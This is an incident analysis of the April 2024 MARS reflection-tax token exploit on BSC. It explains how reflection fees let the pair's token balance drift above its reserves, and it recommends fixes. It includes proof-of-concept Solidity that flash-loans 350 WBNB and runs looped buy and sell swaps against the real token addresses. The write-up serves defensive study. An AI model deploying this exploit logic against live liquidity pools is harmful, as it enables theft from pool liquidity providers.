# MARS — Reflection Tax Token Repeated Swap / sync Reserve Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | MARS |
| **Chain** | BSC |
| **Loss** | >$100,000 |
| **Attack Contract** | [0x797acb32](https://bscscan.com/address/0x797acb321cb10154aa807fcd1e155c34135483cd) |
| **Vulnerable Contract** | [MARS 0x3dC7E6FF](https://bscscan.com/address/0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943) |
| **MARS Token** | [0x436D3629](https://bscscan.com/address/0x436D3629888B50127EC4947D54Bb0aB1120962A0) |
| **Root Cause** | The reflection tax mechanism updates only `balanceOf` without updating the pair's internal reserves, causing an accumulated divergence between reserves and actual balances across repeated buy/sell cycles, enabling arbitrage profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/MARS_exp.sol) |

---

## 1. Vulnerability Overview

The MARS token charges a reflection tax on every transfer, distributing it proportionally to all holders. The attacker flash-loaned 350 WBNB from a V3 pool and routed through a `TokenReceiver` intermediary contract to repeatedly buy and sell large amounts of MARS. The reflection tax caused the pair's actual token balance to grow beyond its stored reserves, and this discrepancy was realized as swap profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: reflection tax token + AMM reserve mismatch
contract MARSToken {
    uint256 public reflectionFee = 5; // 5% reflection tax

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fee = amount * reflectionFee / 100;
        uint256 netAmount = amount - fee;

        _balances[from] -= amount;
        _balances[to] += netAmount;

        // Reflect: fee is distributed proportionally to all holders
        // ← The pair contract is also a holder, so pair balance grows beyond reserves
        _reflectFee(fee);
    }
}

// Uniswap V2 Pair
// reserve = value at the last sync() call
// balance = actual token balance (continuously increasing via reflection tax)
// On swap: balance > reserve → arbitrage profit occurs

// ✅ Safe code: reflection tax tokens are incompatible with standard AMMs
// - Disable reflection tax (exclude the pair)
// - Add pair address to reflection tax exclusion list
mapping(address => bool) public isExcludedFromReflection;

function _reflectFee(uint256 fee) internal {
    // Exclude the pair contract from receiving reflection tax
    // → pair balance always equals reserves
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] PancakeSwap V3 flash loan: borrow 350 WBNB
  │
  ├─→ [2] Repeated buy cycle (via TokenReceiver):
  │         ├─ Swap WBNB → MARS (PancakeRouter)
  │         └─ Reflection tax → pair balance > reserves divergence accumulates
  │
  ├─→ [3] Repeated sell cycle:
  │         ├─ Swap MARS → WBNB
  │         └─ balance > reserve arbitrage profit realized
  │
  ├─→ [4] Repay V3 flash loan + fee
  │
  └─→ [5] >$100K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}

contract TokenReceiver {
    // Intermediary contract for receiving reflection tax
    IERC20 constant MARS = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);
    function withdraw() external {
        MARS.transfer(msg.sender, MARS.balanceOf(address(this)));
    }
}

contract AttackContract {
    IPancakeV3Pool constant v3Pool  = IPancakeV3Pool(/* V3 WBNB pool */);
    IPancakeRouter constant router  = IPancakeRouter(/* PancakeRouter */);
    IERC20 constant MARS  = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);
    IERC20 constant WBNB  = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    TokenReceiver receiver;

    function testExploit() external {
        receiver = new TokenReceiver();
        v3Pool.flash(address(this), 0, 350e18, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        // [1] Repeated buys: WBNB → MARS (into TokenReceiver)
        address[] memory pathBuy = new address[](2);
        pathBuy[0] = address(WBNB); pathBuy[1] = address(MARS);
        for (uint i = 0; i < 10; i++) {
            WBNB.approve(address(router), 35e18);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                35e18, 0, pathBuy, address(receiver), block.timestamp
            );
            receiver.withdraw();
        }

        // [2] Repeated sells: MARS → WBNB (realize reflection tax arbitrage)
        address[] memory pathSell = new address[](2);
        pathSell[0] = address(MARS); pathSell[1] = address(WBNB);
        uint256 marsBal = MARS.balanceOf(address(this));
        MARS.approve(address(router), marsBal);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            marsBal, 0, pathSell, address(this), block.timestamp
        );

        // [3] Repay V3 flash loan
        WBNB.transfer(address(v3Pool), 350e18 + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reflection tax token AMM reserve mismatch |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (flash loan + repeated buy/sell) |
| **DApp Category** | Reflection tax token + AMM |
| **Impact** | Pair liquidity loss (>$100K) |

## 6. Remediation Recommendations

1. **Exclude pair from reflection tax**: Exclude AMM pair addresses from receiving reflection tax
2. **Restrict same-block swaps**: Limit the number of swaps per address per block
3. **Maximum swap ratio**: Limit the maximum swap size relative to reserves in a single TX
4. **Reflection-aware AMM**: Use an AMM designed for reflection tax tokens (standard Uniswap V2 is incompatible)

## 7. Lessons Learned

- Listing a reflection tax token on a standard Uniswap V2 AMM creates a structural mismatch where the pair's actual balance continuously grows beyond its stored reserves.
- AMM vulnerabilities involving reflection tax tokens — such as ATM (2024-04) and MARS — represent a recurring pattern on BSC.
- Token design must account for AMM compatibility: either handle pair addresses with special logic or disable the reflection tax for the pair.